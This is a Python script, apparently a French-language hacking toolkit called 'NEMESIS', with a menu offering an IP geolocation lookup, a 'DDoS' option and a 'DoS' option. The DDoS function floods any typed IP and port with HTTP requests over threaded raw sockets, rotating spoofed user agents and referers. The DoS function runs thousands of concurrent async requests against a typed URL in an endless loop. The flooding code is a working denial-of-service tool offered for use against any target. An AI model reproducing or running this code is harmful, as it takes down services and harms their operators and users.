import asyncio
import aiohttp
import sys
import time
from pystyle import Colorate, Colors, Add
import socket
import random
import threading
import json
import requests
import os
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from sys import stderr

Bl = '\033[30m'  
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'



def is_option(func):
    def wrapper(*args, **kwargs):
        run_banner()
        func(*args, **kwargs)


    return wrapper



@is_option
def tool_info():
         time.sleep(1)
         print(Colorate.Horizontal(Colors.red_to_orange, f"dev by snj       discord : 1258616348377092122"))


@is_option
def IP_Tracker():
     time.sleep(1)
     banner()

     ip = input(Colorate.Horizontal(Colors.blue_to_purple, f"\n Enter IP target : "))
     print()
     print(Colorate.Horizontal(Colors.blue_to_purple, f' Information sur cette ip'))
     try:
         req_api = requests.get(f"http://ipwho.is/{ip}")
         ip_data = json.loads(req_api.text)
         time.sleep(2)
         print(Colorate.Horizontal(Colors.blue_to_purple, f"\n IP target       :", ip))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Type IP         :", ip_data["type"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Pays         :", ip_data["country"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Ville            :", ip_data["city"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Continent       :", ip_data["continent"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" EU              :", ip_data["is_eu"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Code Postal          :", ip_data["postal"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Capital         :", ip_data["capital"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" ASN             :", ip_data["connection"]["asn"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" ORG             :", ip_data["connection"]["org"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" ISP             :", ip_data["connection"]["isp"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Domain          :", ip_data["connection"]["domain"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" ID              :", ip_data["timezone"]["id"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" ABBR            :", ip_data["timezone"]["abbr"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" DST             :", ip_data["timezone"]["is_dst"]))
         print(Colorate.Horizontal(Colors.blue_to_purple, f" Offset          :", ip_data["timezone"]["offset"]))

     except Exception as e:
         print(Colorate.Horizontal(Colors.blue_to_purple, f"Adresse IP invalide : {e}"))
         return IP_Tracker()

@is_option
def DDoS():
    time.sleep(1)
    useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]

    ref=['http://www.bing.com/search?q=',
    'https://www.google.com.com/search/q=',
    'https://duckduckgo.com/?q=',
    'https://yahoo.com/search?p=']

    acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"]

    ip = str(input(Colorate.Horizontal(Colors.green_to_cyan, 'ip cible: ')))
    port = int(input(Colorate.Horizontal(Colors.green_to_cyan, 'Port: ')))
    pack = int(input(Colorate.Horizontal(Colors.green_to_cyan, 'Packet/s: ')))
    thread = int(input(Colorate.Horizontal(Colors.green_to_cyan, 'Threads: ')))

    def start():
        global useragents, ref, acceptalln
        hh = random._urandom(3016)
        xx = int(0)
        useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
        accept = random.choice(acceptall)
        reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
        content    = "Content-Type: application/x-www-form-urlencoded\r\n"
        length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip),int(port)))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(pack))
                print(Colorate.Horizontal(Colors.green_to_cyan, f"Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx)))
            except:
                s.close()
                print(Colorate.Horizontal(Colors.green_to_cyan, f'Attaque reussie'))

    for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()


@is_option
def DoS():
    time.sleep(1)
    headers = {
       "User-Agent": "Flyier DoS"
    }

    osystem = sys.platform
    if osystem == "linux":
     os.system("clear")
    else:
     os.system("cls")

    reqs = []
    r = 0
    url = input(Colorate.Horizontal(Colors.yellow_to_red, f"Enter Web Url-> ").strip())
    print()
    time.sleep(1)

    if not url.startswith("http"):
     url = "http://" + url

    print(url)

    async def fetch(session, url):
     global r, reqs
     while True:
         try:
             async with session.get(url, headers=headers) as response:
                 reqs.append(response.status)
                 if response.status == 200:
                     r += 1
                 sys.stdout.write(f"Requests: {str(len(reqs))} | Response Status Code => {str(response.status)}\r")
                 sys.stdout.flush()
         except Exception as e:
             print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] Error: {e}"))
         await asyncio.sleep(0.05)  

    async def main():
        tasks = []
        async with aiohttp.ClientSession() as session:
            for _ in range(500):  
                task = asyncio.create_task(fetch(session, url))
                tasks.append(task)
            await asyncio.gather(*tasks)

    def run_event_loop():
        while True:
            asyncio.run(main())

    if __name__ == '__main__':
        threads = []
        for _ in range(50):  
            th = threading.Thread(target=run_event_loop)
            th.start()
            threads.append(th)
    
        for th in threads:
            th.join()   

# OPTIONS
options = [
    {
        'num': 1,
        'text': 'Tool Info',
        'func': tool_info
    },
    {
        'num': 2,
        'text': 'IP tracker',
        'func': IP_Tracker

    },
    {
        'num': 3,
        'text': 'DDoS',
        'func': DDoS
    },
    {
        'num': 4,
        'text': 'DoS',
        'func': DoS
    },
    {
        'num': 0,
        'text': 'Exit',
        'func': exit
    }
]


def clear():
    # for windows
    if os.name == 'nt':
        _ = os.system('cls')
    # for mac and linux
    else:
        _ = os.system('clear')


def call_option(opt):
    if not is_in_options(opt):
        raise ValueError('Option not found')
    for option in options:
        if option['num'] == opt:
            if 'func' in option:
                option['func']()
            else:
                print('No function detected')


def execute_option(opt):
    try:
        call_option(opt)
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue')
        main()
    except ValueError as e:
        print(e)
        time.sleep(2)
        execute_option(opt)
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()


def option_text():
    text = ''
    for opt in options:
        text += f'{Wh}[ {opt["num"]} ] {Gr}{opt["text"]}\n'
    return text


def is_in_options(num):
    for opt in options:
        if opt['num'] == num:
            return True
    return False


def banner():
    # BANNER TOOLS
    clear()
    stderr.writelines(f"""    
      _   _ _____ __  __ _____ ____ ___ ____  
     | \ | | ____|  \/  | ____/ ___|_ _/ ___| 
     |  \| |  _| | |\/| |  _| \___ \| |\___ \ 
     | |\  | |___| |  | | |___ ___) | | ___) |
     |_| \_|_____|_|  |_|_____|____/___|____/ 
    """)

    stderr.writelines(f"\n\n\n{option_text()}")


def run_banner():
    clear()
    time.sleep(1)
    ascii = r'''
                       .::.
                    .:'  .:
          ,MMM8&&&.:'   .:'
         MMMMM88&&&&  .:'
        MMMMM88&&&&&&:'
        MMMMM88&&&&&&
      .:MMMMM88&&&&&&
    .:'  MMMMM88&&&&
  .:'   .:'MMM8&&&'
  :'  .:'
  '::'  
 '''

def main():
    clear()
    banner()
    time.sleep(1)
    try:
        opt = int(input(Colorate.Horizontal(Colors.purple_to_blue, "Choisis une option : ")))
        execute_option(opt)
    except ValueError:
        print(Colorate.Horizontal(Colors.red, 'Mauvaise option'))
        time.sleep(2)
        main()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.green_to_cyan, 'Sortie'))
        time.sleep(2)
        exit()
